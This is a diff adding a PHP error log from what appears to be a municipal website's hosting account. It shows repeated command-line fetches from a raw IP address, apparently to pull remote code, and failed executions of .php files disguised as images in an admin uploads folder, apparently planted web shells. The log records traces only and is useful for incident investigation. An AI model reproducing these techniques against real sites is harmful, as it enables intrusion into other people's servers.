@@ -1,0 +1,56 @@
+[02-Jan-2018 06:54:08 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/3Bu7Zn6): failed to open stream: Connection timed out in Command line code on line 1
+[02-Jan-2018 06:55:09 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/3Bu7Zn6): failed to open stream: Connection timed out in Command line code on line 1
+[02-Jan-2018 06:56:09 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/3Bu7Zn6): failed to open stream: Connection timed out in Command line code on line 1
+[02-Jan-2018 06:57:09 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/3Bu7Zn6): failed to open stream: Connection timed out in Command line code on line 1
+[02-Jan-2018 06:58:09 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/3Bu7Zn6): failed to open stream: Connection timed out in Command line code on line 1
+[02-Jan-2018 07:56:40 Etc/GMT] PHP Warning:  file_get_contents(http://141.255.149.225:8080/4wEWWKe5VJsKK): failed to open stream: Connection timed out in Command line code on line 1
+[04-Jan-2018 05:46:45 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:46:45 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:46:51 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:46:51 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:48:18 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:48:18 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:49:04 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:49:04 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:49:14 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:49:14 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image111.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:53:07 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:53:07 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:53:26 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:53:26 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 05:54:09 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 05:54:09 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 09:33:42 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 09:33:42 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[04-Jan-2018 09:34:24 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[04-Jan-2018 09:34:24 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[08-Jan-2018 05:38:55 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[08-Jan-2018 05:38:55 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[08-Jan-2018 10:15:33 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[08-Jan-2018 10:15:33 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[08-Jan-2018 10:15:40 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[08-Jan-2018 10:15:40 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image111.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[08-Jan-2018 10:15:42 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[08-Jan-2018 10:15:42 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[06-Feb-2018 10:29:42 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[06-Feb-2018 10:29:42 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[06-Feb-2018 10:29:51 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[06-Feb-2018 10:29:51 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[06-Feb-2018 10:29:54 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[06-Feb-2018 10:29:54 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image111.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[06-Feb-2018 10:29:56 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[06-Feb-2018 10:29:56 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[23-Feb-2018 22:34:06 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[23-Feb-2018 22:34:06 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[23-Feb-2018 22:34:06 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[23-Feb-2018 22:34:06 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[23-Feb-2018 22:34:32 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[23-Feb-2018 22:34:32 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[23-Feb-2018 22:34:32 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[23-Feb-2018 22:34:32 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[15-Mar-2018 05:40:18 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[15-Mar-2018 05:40:18 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image109.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[15-Mar-2018 05:40:20 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[15-Mar-2018 05:40:20 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image113.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
+[15-Mar-2018 05:40:23 Etc/GMT] PHP Warning:  Unknown: failed to open stream: Permission denied in Unknown on line 0
+[15-Mar-2018 05:40:23 Etc/GMT] PHP Fatal error:  Unknown: Failed opening required '/home2/dhuliyanmunicipa/public_html/dhuliyannew/admin/uploads/subcat/subcat_image112.php' (include_path='.:/opt/alt/php54/usr/share/pear:/opt/alt/php54/usr/share/php') in Unknown on line 0
